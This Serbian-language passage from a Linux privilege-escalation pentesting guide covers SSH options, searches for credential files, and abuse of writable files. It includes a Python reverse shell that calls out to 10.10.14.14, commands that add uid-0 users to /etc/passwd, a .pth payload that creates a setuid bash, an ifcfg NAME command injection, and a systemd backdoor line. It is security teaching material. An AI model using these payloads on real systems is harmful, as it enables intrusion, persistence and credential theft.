Ove datoteke utiču na to ko može da se prijavi i kako:

- **`/etc/nologin`**: ako postoji, blokira prijave korisnika koji nisu root i prikazuje svoju poruku.
- **`/etc/securetty`**: ograničava gde root može da se prijavi (dozvoljena TTY lista).
- **`/etc/motd`**: baner nakon prijave (može da leak-uje informacije o okruženju ili održavanju).

### PermitRootLogin

Određuje da li root može da se prijavi pomoću ssh-a. Podrazumevana vrednost u upstream OpenSSH-u je `prohibit-password`; konfiguracija distribucije može da je nadjača. Moguće vrednosti:

- `yes`: root može da se prijavi pomoću lozinke i privatnog ključa
- `without-password` ili `prohibit-password`: root može da se prijavi samo pomoću privatnog ključa
- `forced-commands-only`: root može da se prijavi samo pomoću privatnog ključa i ako su navedene opcije za komande
- `no` : ne

### Pouzdani autoriteti za SSH korisničke sertifikate

`TrustedUserCAKeys` navodi javne ključeve kojima sshd veruje za potpisivanje **korisničkih** sertifikata. Ako je odgovarajući privatni CA ključ čitljiv korisniku sa nižim privilegijama, proverite ko može da dobije sertifikat i kao koje naloge može da se autentifikuje. `AuthorizedPrincipalsFile` ili `AuthorizedPrincipalsCommand` mogu da ograniče prihvaćena imena; ako nijedno nije konfigurisano, sertifikat mora da sadrži ime ciljnog naloga. `PermitRootLogin prohibit-password` blokira prijavu root-a lozinkom, ali i dalje može da dozvoli autentifikaciju sertifikatom. Sama izložena putanja do ključa ne dokazuje da je pristup moguć: proverite par javnog i privatnog ključa, efektivna `Match` pravila, politiku naloga, lozinku ključa, opoziv i prihvaćene algoritme potpisa. Ne uključujte bajtove privatnog ključa u izlaz enumeracije. Pogledajte [priručnik za konfiguraciju OpenSSH servera](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Privatni CA ključ može da se koristi i **bez mogućnosti čitanja** od strane trenutnog korisnika ako pravilo za delegiranje privilegija dozvoljava tom korisniku da, u identitetu vlasnika ključa, pozove neograničen [potpisivač sertifikata kao što je `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s). Uporedite tačnu dozvoljenu komandu i argumente sa pristupom potpisivačkog naloga ključu, javnim CA ključem kojem veruje efektivna sshd konfiguracija, principal-om prihvaćenim za ciljni nalog, važenjem sertifikata i politikom prijave tog naloga. Delegirana komanda za potpisivanje ili pouzdana CA datoteka same po sebi ne dokazuju pristup drugom nalogu; nemojte potpisivati probni sertifikat tokom pasivne enumeracije.

Za zasebnu putanju poverenja CA za pojedinačni nalog pogledajte [zabunu oko delimitera principal-a u SSH sertifikatima](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Navodi datoteke koje sadrže javne ključeve za autentifikaciju korisnika. Može da sadrži tokene kao što je `%h`, koji će biti zamenjeni putanjom do matičnog direktorijuma. **Možete navesti apsolutne putanje** (koje počinju sa `/`) ili **relativne putanje u odnosu na korisnikov matični direktorijum**. Na primer:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Ta konfiguracija označava da će, ako pokušate da se prijavite pomoću **privatnog** ključa korisnika "**testusername**", ssh uporediti javni ključ vašeg ključa sa ključevima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **koristite svoje lokalne SSH ključeve umesto da ključeve** (bez passphrase-a!) ostavljate na serveru. Tako ćete moći da **jump** putem ssh-a **na host**, a zatim odatle **jump na drugi host** **pomoću** **ključa** koji se nalazi na vašem **početnom hostu**.

Ovu opciju treba da podesite u `$HOME/.ssh.config` ovako:

```
Host example.com
  ForwardAgent yes
```

Obratite pažnju na to da će, ako je `Host` svaki put podešen na `*`, host moći da pristupi ključevima svaki put kada korisnik pređe na drugu mašinu (što predstavlja bezbednosni problem).

Datoteka `/etc/ssh_config` može **da nadjača** ove **opcije** i da dozvoli ili zabrani ovu konfiguraciju.\
Datoteka `/etc/sshd_config` može da **dozvoli** ili **zabrani** prosleđivanje ssh-agent-a pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako utvrdite da je prosleđivanje agent-a konfigurisano u okruženju, pročitajte sledeću stranicu jer **možda možete to da zloupotrebite za eskalaciju privilegija**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljive datoteke

### Datoteke profila

Datoteka `/etc/profile` i datoteke u direktorijumu `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novu ljusku**. Zato, ako možete da **pišete u bilo koju od njih ili da je izmenite, možete da eskalirate privilegije**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Ako pronađeš neku neobičnu profile skriptu, proveri da li sadrži **osetljive podatke**.

### Passwd/Shadow datoteke

U zavisnosti od OS-a, datoteke `/etc/passwd` i `/etc/shadow` možda imaju drugačija imena ili postoji njihova rezervna kopija. Zato se preporučuje da **pronađeš sve te datoteke** i **proveriš da li možeš da ih čitaš**, kako bi utvrdio **da li sadrže hash-eve**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

U nekim slučajevima možete pronaći **hash-eve lozinki** u datoteci `/etc/passwd` (ili ekvivalentnoj)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Upisiv /etc/passwd

Prvo, generišite lozinku jednom od sledećih komandi.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Zatim dodajte korisnika `hacker` i generisanu lozinku.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Npr: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete da koristite komandu `su` sa `hacker:hacker`

Druga mogućnost je da upotrebite sledeće linije da biste dodali probnog korisnika bez lozinke.\
UPOZORENJE: možete da narušite trenutnu bezbednost mašine.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NAPOMENA: Na BSD platformama, `/etc/passwd` se nalazi u datotekama `/etc/pwd.db` i `/etc/master.passwd`, a `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Trebalo bi da proverite da li možete da **pišete u neke osetljive datoteke**. Na primer, možete li da pišete u neku **datoteku konfiguracije servisa**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Na primer, ako mašina pokreće **tomcat** server i možete da **izmenite konfiguracionu datoteku Tomcat servisa unutar /etc/systemd/,** onda možete da izmenite linije:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Vaš backdoor će biti izvršen kada sledeći put pokrenu tomcat.

### Proverite fascikle

Sledeće fascikle mogu sadržati rezervne kopije ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednju, ali pokušajte)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Neobične lokacije/fajlovi u vlasništvu

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Izmenjene datoteke u poslednjih nekoliko minuta

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB files

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Za čitljive baze podataka aplikacija pregledajte nazive tabela i kolona i potražite korisnička imena i hash vrednosti lozinki. Pronalaženje hash vrednosti, otkrivanje lozinke i potvrda da se ista lozinka koristi za lokalni nalog odvojeni su koraci; generički 32-znakovni heksadecimalni niz nije dovoljan da bi se zaključilo da je u pitanju MD5 ili da postoji pristup nalogu.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Ako čitljiva istorija shell-a sadrži komandu `sudo` iza koje sledi kratak red koji liči na lozinku, ručno proverite okolne redove. Lozinka uneta u uobičajeni `sudo` prompt ne čuva se u istoriji shell-a; naredni red je samo mogući slučajni unos u shell, a ne dokaz da je lozinka važeća. Marker `.sudo_as_admin_successful` beleži prethodnu upotrebu, a ne trenutnu autorizaciju.

### Skriveni fajlovi

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Skripte/binarne datoteke u PATH-u**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Veb datoteke**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Rezervne kopije**

Pregledajte čitljive datoteke u direktorijumima sa rezervnim kopijama, kao i datoteke čiji **nazivi** sadrže `backup`: arhiva sa neprozirnim nazivom ili šifrovanom ekstenzijom i dalje može otkriti stare podatke aplikacije. Šifrovana arhiva samo je kandidat za proveru izloženosti. Oporavak lozinke, pregled njenog sadržaja, oporavak hash-a aplikacije i ponovna upotreba te lozinke za Unix nalog zasebni su koraci koje treba proveriti; hash u arhivi ne dokazuje da je moguć lokalni login.

Čitljive rezervne kopije virtuelnih mašina takođe treba pregledati. VirtualBox `.vbox` konfiguracija može da otkrije prikačene `.vdi` slike i sadrži metapodatke ključa za šifrovanje diska; [VirtualBox dokumentuje da se šifrovani ključ podataka čuva u konfiguraciji VM-a](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). I konfiguracija i slika moraju biti dostupne da bi bio moguć offline pregled diska. Gostujući volumen može imati zaseban [LUKS sloj šifrovanja](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), za koji je potreban poseban ključ. Čak i nakon ovlašćenog dešifrovanja, stare skripte ili konfiguracije mogu sadržati lozinku; utvrdite da li je credential i dalje važeći za nalog na hostu i da li njegova efektivna `sudo` politika dozvoljava privilegovanu komandu pre nego što ovo nazovete lokalnom eskalacijom privilegija. Tokom pasivnog enumerisanja popišite putanje i dozvole bez kopiranja, dešifrovanja ili montiranja slika.

Prilikom pregleda čitljive arhive, prvo izlistajte nazive njenih članova, pa tek onda bilo šta raspakujte: mogu biti prisutne skrivene datoteke za autentifikaciju, materijal sa kodovima za oporavak ili SSH ključevi, čak i ako su aktivne kopije zaštićene. Nazivi datoteka samo ukazuju na mogući trag; zasebno proverite materijal i eventualnu ponovnu upotrebu naloga.

Dajte prednost **čitljivim arhivama u vlasništvu drugog korisnika** u direktorijumima sa rezervnim kopijama, naročito arhivama u vlasništvu root-a i onima dostupnim preko članstva u grupi. Stara arhiva može sadržati konfiguraciju ili tajnu za autentifikaciju, čak i kada je aktivna kopija zaštićena. Za lokalni backup UI kao što je [Backrest](https://garethgeorge.github.io/backrest/), proverite efektivni nalog servisa i da li korisnik sa nižim privilegijama može da čita njegovu konfiguraciju ili da se autentifikuje na UI. Njegovi [hooks](https://garethgeorge.github.io/backrest/docs/hooks) i [restic command interface](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) mogu da rade sa privilegijama servisa za pristup datotekama i izvršavanje komandi; listener vezan samo za loopback sam po sebi ne određuje uticaj. Backrest `passwordBcrypt` je bcrypt hash kodiran u base64 formatu u njegovom [authentication code-u](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), a ne lozinka u čistom tekstu. Proverite identitet servisa, upotrebljive credentials i pristup relevantnom planu ili repozitorijumu pre nego što izloženu arhivu ili UI označite kao granicu privilegija.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Poznate datoteke koje sadrže lozinke

Pročitajte kod alata [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS); on traži **nekoliko mogućih datoteka koje mogu da sadrže lozinke**.\
**Još jedan zanimljiv alat** koji možete da koristite za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), aplikacija otvorenog koda koja se koristi za preuzimanje velikog broja lozinki sačuvanih na lokalnom računaru za Windows, Linux i Mac.

Ako je datoteka `/etc/guacamole/guacamole.properties` čitljiva, pregledajte njena podešavanja za povezivanje sa bazom podataka `mysql-*`, `postgresql-*` ili `sqlserver-*`. Ako je nalog ovlašćen da čita Guacamole JDBC tabele, `guacamole_connection_parameter` može da sadrži sačuvane vrednosti za SSH `username`, `password`, `private-key` ili `passphrase`. Počnite od ID-jeva veza i naziva parametara, a zatim pregledajte samo relevantne redove; sačuvana vrednost može biti dinamički token ili referenca na vault, a ne tajna koja može ponovo da se upotrebi. Pogledajte [Guacamole JDBC šemu](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) i [parametre SSH veze](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[Podrazumevana baza podataka alata pswm](https://github.com/Julynx/pswm#usage) čuva šifrovani vault u putanji `~/.local/share/pswm/pswm`. Ako je vault drugog korisnika vidljiv, proverite njegovo vlasništvo i da li vaš nalog zaista može da ga čita. Sama putanja do vault-a ne otkriva akreditive; oporavak njegove glavne lozinke, pronalaženje lozinke naloga koja može ponovo da se upotrebi i potvrda privilegija tog naloga zasebni su koraci.

[Podrazumevana baza podataka alata Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) nalazi se u putanji `~/.passpie/`, sa prstenom ključeva `.keys` i šifrovanim datotekama akreditiva `.pass` u direktorijumima grupa. Vidljiv direktorijum baze podataka samo ukazuje na putanju: potvrdite pristup ključu i relevantnom šifrovanom unosu, proverite da li je potrebna glavna fraza za pristup i utvrdite da li oporavljeni akreditiv pripada nalogu sa većim privilegijama. Passpie podržava i [prilagođene putanje do baza podataka](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), tako da podrazumevana putanja ne obuhvata sve mogućnosti. Automatizovana enumeracija treba da izlista metapodatke, bez izvoza akreditiva ili ispisivanja materijala ključa.

### Dnevnici

Ako možete da čitate dnevnike, možda ćete u njima pronaći **zanimljive/poverljive informacije**. Što je dnevnik čudniji, to će biti zanimljiviji (verovatno).\
Takođe, neka "**loše**" konfigurisani (sa backdoor-om?) **dnevnici revizije** mogu vam omogućiti da **zabeležite lozinke** u dnevnicima revizije, kao što je objašnjeno u ovom tekstu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Da biste **čitali logove, grupa** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) će biti veoma korisna.

### Shell datoteke

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Generička pretraga kredencijala/regex

Takođe treba da proverite da li postoje fajlovi koji u **nazivu** ili **sadržaju** sadrže reč "**password**", kao i da proverite da li se u logovima nalaze IP adrese i imejl adrese, odnosno regex obrasci za hash vrednosti.\
Neću ovde navoditi kako se sve to radi, ali ako vas zanima, možete pogledati poslednje provere koje obavlja [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Fajlovi u koje je moguće pisati

### Python library hijacking

Ako znate **odakle** će se izvršavati Python skripta i **možete da pišete u** tu fasciklu ili da **menjate Python biblioteke**, možete da izmenite biblioteku OS-a i da je backdoor-ujete (ako možete da pišete u fasciklu iz koje će se izvršavati Python skripta, kopirajte i nalepite biblioteku os.py).

Da biste **backdoor-ovali biblioteku**, samo dodajte sledeći red na kraj biblioteke os.py (promenite IP i PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### Upisiv `.pth` koji obrađuje `site.addsitedir()`

Nemojte tretirati `site.addsitedir(DIR)` kao ekvivalent za `sys.path.append(DIR)`. Ova funkcija takođe obrađuje svaku datoteku `*.pth` u direktorijumu `DIR`. Linija koja počinje sa `import`, iza kog sledi razmak ili tabulator, izvršava se kao Python kod. Linije sa putanjama se umesto toga razrešavaju relativno u odnosu na direktorijum site i dodaju samo ako te putanje postoje.<sup>[[38]](#references)</sup>

Ovo dovodi do eskalacije privilegija kada Python program za čije pokretanje je dozvoljen `sudo`, ili neki drugi program sa povišenim privilegijama, pozove `site.addsitedir()` nad direktorijumom u koji trenutni korisnik ili neka od njegovih grupa mogu da upisuju. Kod iz `.pth` datoteke izvršava se dok program sa povišenim privilegijama podešava svoju putanju za uvoz, pre nego što se pokrene njegova uobičajena radnja.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Izvršni sadržaj `.pth` datoteke mora stati u jedan red, ali tačka-zarez omogućava više naredbi. Na primer, putanja izvršavanja kao root može da napravi setuid kopiju Bash-a; pokrenite Bash sa `-p` kako bi sačuvao efektivni ID.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Opcija `-S` samo onemogućava Python-ovu automatsku inicijalizaciju `site`. Ne štiti program koji eksplicitno uvozi `site` i poziva `site.addsitedir()`. Uklonite direktorijume u koje napadač može da upisuje iz privilegovanih putanja za uvoz i zahtevajte da direktorijum i njegove `.pth` datoteke budu u vlasništvu privilegovanog administratora i da samo on može da upisuje u njih.<sup>[[38]](#references)[[39]](#references)</sup>

### Eksploatacija logrotate-a

Privilegovani `logrotate` zadatak može da napravi putanju za upis u datoteke drugog korisnika kada zaista rotira log ispod direktorijuma koji korisnik sa nižim privilegijama može da zameni ili preusmeri tokom rotacije. Sam log u koji može da se upisuje samo je trag. Potvrdite tačno aktivno pravilo i njegove direktive `create`, `olddir` i `su`; efektivni identitet planera zadataka; dozvole za upis i pretragu nad roditeljskim direktorijumom loga; i da li instalirana verzija i pravila dozvoljavaju promenu odredišta. Da bi upis u startup datoteku doveo do izvršavanja komandi, kasnija privilegovana shell sesija mora i da učita dobijenu datoteku. Pregledajte raspored, pravilo, verziju/paketiranje i metapodatke putanje bez pokretanja rotacije ili pokušaja da izazovete race condition.

> [!TIP]
> Nemojte smatrati `3.18.0` ili bilo koji niz verzije sam po sebi granicom iskoristivosti. [Dnevnik promena upstream projekta](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) beleži ojačanu zaštitu direktorijuma i symlink-ova u više izdanja, a distribucije mogu da prenesu ispravke i u starije verzije. [Upstream priručnik](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) preporučuje `su` kada root rotira logove u direktorijumima pod kontrolom neprivilegovanih korisnika; proverite efektivno pravilo i stvarno ponašanje.

Detaljnije informacije o ranjivosti možete pronaći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Ovu ranjivost možete iskoristiti pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična ranjivosti [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logovi),** zato, kad god utvrdite da možete da menjate logove, proverite ko njima upravlja i da li možete da eskalirate privilegije tako što ćete logove zameniti symlink-ovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenca za ranjivost:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Datoteka `ifcfg-*` razlog je za proveru ako korisnik sa nižim privilegijama može da je kreira ili menja **i** ako će je privilegovana putanja za aktivaciju mreže pročitati. Potvrdite efektivne dozvole za datoteku i direktorijum, izabrani interfejs, instaliranu implementaciju `ifup`/`ifdown` i ko je poziva. Sama mogućnost upisa u datoteku ne dovodi do izvršavanja. [Red Hat-ov vodič za umrežavanje u RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) pravi razliku između zastarelih mrežnih skripti i NetworkManager-a: ovaj drugi sam po sebi ne pokreće prve. [Dokumentacija za RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) navodi da podrazumevani `ifup`/`ifdown` koriste NetworkManager, dok opcioni legacy paket obezbeđuje shell skripte.

Na sistemu koji zaista koristi privilegovane legacy skripte, nequoted dodela u `ifcfg-*` datoteci koja se učitava kao shell skripta, kao što je `NAME=`, može da pređe granicu ka izvršavanju koda. Proverite tačan parser, vrednost i putanju aktivacije; nemojte zaključivati da se sadržaj tumači kao shell kod samo na osnovu imena datoteke ili prisustva NetworkManager-a. Wrapper koji je dozvoljen preko sudo-a, upisuje korisnički unos u datoteku `ifcfg-*`, a zatim poziva legacy `ifup`, predstavlja zaseban put do ove granice, čak i kada pozivalac ne može direktno da menja datoteku.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Imajte na umu razmak između Network i /bin/id_)

### **init, init.d, systemd i rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje servisima**. Uključuje skripte za `start`, `stop`, `restart`, a ponekad i `reload` servisa. Mogu se izvršavati direktno ili putem simboličkih veza u `/etc/rc?.d/`. Alternativna putanja u Redhat sistemima je `/etc/rc.d/init.d`.

S druge strane, `/etc/init` povezan je sa **Upstart**, novijim sistemom za **upravljanje servisima** koji je uveo Ubuntu i koristi konfiguracione datoteke za zadatke upravljanja servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste uporedo sa Upstart konfiguracijama zbog sloja kompatibilnosti u Upstartu.

**systemd** se pojavio kao moderan sistem za inicijalizaciju i upravljanje servisima, sa naprednim funkcijama kao što su pokretanje demona na zahtev, upravljanje automatskim montiranjem i snimci stanja sistema. Datoteke organizuje u `/usr/lib/systemd/` za pakete distribucije i `/etc/systemd/system/` za izmene administratora, čime pojednostavljuje administraciju sistema.<sup>[[21]](#references)</sup>

## Ostali trikovi

### Eskalacija privilegija preko NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Izlazak iz ograničenih shell-ova


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../../network-services-pentesting/cisco-sd-wan-manager-local-privilege-escalation.md
{{#endref}}

## Android rooting okviri: zloupotreba manager-channel-a

Android rooting okviri obično kače syscall kako bi userspace manager-u omogućili pristup privilegovanim funkcijama kernela. Slaba autentifikacija manager-a (npr. provere potpisa zasnovane na redosledu FD-ova ili loše šeme lozinki) može lokalnoj aplikaciji omogućiti da se predstavlja kao manager i dobije root privilegije na već root-ovanim uređajima. Više informacija i detalje o eksploataciji možete pronaći ovde:


{{#ref}}
../../../mobile-pentesting/android-app-pentesting/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Otkrivanje VMware Tools servisa i LPE (CWE-426) preko exec-a zasnovanog na regex-u (CVE-2025-41244)

Otkrivanje servisa zasnovano na regex-u u VMware Tools/Aria Operations može izdvojiti putanju do binarne datoteke iz komandnih linija procesa i izvršiti je sa argumentom -v u privilegovanom kontekstu. Permisivni obrasci (npr. oni koji koriste \S) mogu da odgovaraju listener-ima koje je napadač smestio na lokacije sa dozvolom upisa (npr. /tmp/httpd), što može dovesti do izvršavanja kao root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Više informacija i uopšteni obrazac primenljiv na druge sisteme za otkrivanje/nadgledanje možete pronaći ovde:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Bezbednosne zaštite kernela

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix alati za eskalaciju privilegija

### **Najbolji alat za pronalaženje lokalnih vektora eskalacije privilegija na Linuxu:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opcija -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Ispisivanje kernel ranjivosti na Linuxu i MAC-u [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fizički pristup):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Zbirka dodatnih skripti**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (eskalacija privilegija preko Crontab UI-ja, ponovna upotreba zip -P akreditiva)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: falsifikovani .text_sig payload za cron-om pokrenuti monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: zaobilaženje Neighborhood Watch-a (otimanje sudo env_keep PATH-a)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Osnove eskalacije privilegija na Linuxu](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Vodič za eskalaciju privilegija na Linuxu](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Napad i odbrana: tehnike eskalacije privilegija na Linuxu iz 2016. godine](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Niko ne očekuje izvršavanje komandi!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
